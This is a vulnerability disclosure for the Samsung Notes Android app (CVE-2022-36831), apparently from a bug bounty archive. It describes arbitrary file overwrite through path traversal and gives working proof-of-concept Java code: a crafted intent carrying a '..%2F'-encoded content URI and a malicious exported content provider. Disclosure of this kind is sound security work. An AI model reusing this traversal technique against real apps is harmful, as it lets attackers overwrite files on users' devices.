# Details

<table>
    <tr>
        <td>Name</td>
        <td>Samsung Notes</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.app.notes</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.04.21</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.08.02</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-36831">CVE-2022-36831</a> (SVE-2022-0983)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$1180</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/058.%20Samsung%20Notes%20—%20Overwriting%20of%20arbitrary%20files/Oversecured_report.png)

As we can see from the screenshot, the app insecurely concatenates the value of `Uri.getLastPathSegment()` to the file path and saves content from the attacker-controlled URI to the resulting path. This allowed the attacker to overwrite arbitrary files.

**Proof of Concept**

This code creates the file `/sdcard/test.txt` and writes the value `test` there.

File `MainActivity.java`:
```java
ClipData clipData = ClipData.newRawUri("", Uri.parse("content://poc.provider/..%2F..%2F..%2F..%2F..%2Fsdcard%2Ftest.txt"));
clipData.addItem(new ClipData.Item(Uri.parse("")));

Intent i = new Intent("android.intent.action.SEND");
i.setClassName("com.samsung.android.app.notes", "com.samsung.android.support.senl.nt.app.trigger.PdfOnlyOpenTriggerActivity");
i.setClipData(clipData);
startActivity(i);
```

File `AndroidManifest.xml`:
```xml
<provider android:name=".MyContentProvider" android:authorities="poc.provider" android:exported="true" />
```

File `MyContentProvider.java`:
```java
public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
    try {
        return getContext().getAssets().openFd("test.txt").getParcelFileDescriptor();
    } catch (IOException e) {
        throw new FileNotFoundException(e.getMessage());
    }
}
```
